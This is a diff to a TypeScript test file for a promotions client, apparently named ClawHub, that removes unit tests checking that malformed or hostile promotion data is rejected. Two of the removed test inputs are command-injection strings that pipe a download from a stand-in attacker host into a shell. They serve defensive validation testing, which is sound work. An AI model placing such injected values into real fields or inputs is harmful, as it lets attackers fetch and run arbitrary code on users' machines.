@@ -4,7 +4,6 @@ import {
   fetchClawHubPromotion,
   fetchClawHubPromotions,
   fetchClawHubPromotionsFeed,
-  parseClawHubPromotion,
   parseClawHubPromotionsFeed,
 } from "./clawhub.js";
 
@@ -24,68 +23,6 @@ const validPromotion = {
   models: [{ modelRef: "openrouter/example/model-alpha", alias: "Alpha", suggestedDefault: true }],
   signupUrl: "https://signup.example.com",
 };
-
-describe("parseClawHubPromotion", () => {
-  it("parses a full promotion payload", () => {
-    const parsed = parseClawHubPromotion({
-      ...validPromotion,
-      pluginNames: ["@openclaw/openrouter-provider"],
-    });
-    expect(parsed.slug).toBe("spring-models");
-    expect(parsed.models[0]?.suggestedDefault).toBe(true);
-    expect(parsed.pluginNames).toEqual(["@openclaw/openrouter-provider"]);
-  });
-
-  it("rejects payloads without models", () => {
-    expect(() => parseClawHubPromotion({ ...validPromotion, models: [] })).toThrow(/models/);
-  });
-
-  it("rejects slugs outside ClawHub's slug contract", () => {
-    // Slugs are echoed into copy-paste commands; shell metacharacters must fail parsing.
-    expect(() =>
-      parseClawHubPromotion({ ...validPromotion, slug: "deal; curl evil.sh|sh" }),
-    ).toThrow(/slug/);
-    expect(() => parseClawHubPromotion({ ...validPromotion, slug: "UPPER-case" })).toThrow(/slug/);
-  });
-
-  it("rejects model refs with shell metacharacters", () => {
-    expect(() =>
-      parseClawHubPromotion({
-        ...validPromotion,
-        models: [{ modelRef: "openrouter/foo; curl https://evil.example/sh | sh" }],
-      }),
-    ).toThrow(/unsupported characters/);
-  });
-
-  it("rejects non-string model refs", () => {
-    expect(() => parseClawHubPromotion({ ...validPromotion, models: [{ modelRef: 42 }] })).toThrow(
-      /modelRef/,
-    );
-  });
-
-  it("rejects non-numeric windows", () => {
-    expect(() => parseClawHubPromotion({ ...validPromotion, endsAt: "soon" })).toThrow(/endsAt/);
-  });
-
-  it("rejects inverted promotion windows", () => {
-    expect(() =>
-      parseClawHubPromotion({
-        ...validPromotion,
-        startsAt: 200,
-        endsAt: 200,
-      }),
-    ).toThrow(/window/);
-  });
-
-  it("rejects plugin values that are not package names", () => {
-    expect(() =>
-      parseClawHubPromotion({
-        ...validPromotion,
-        pluginNames: ["@openclaw/openrouter-provider@latest"],
-      }),
-    ).toThrow(/pluginNames/);
-  });
-});
 
 describe("promotion fetches", () => {
   it("fetches and validates the active promotions list", async () => {
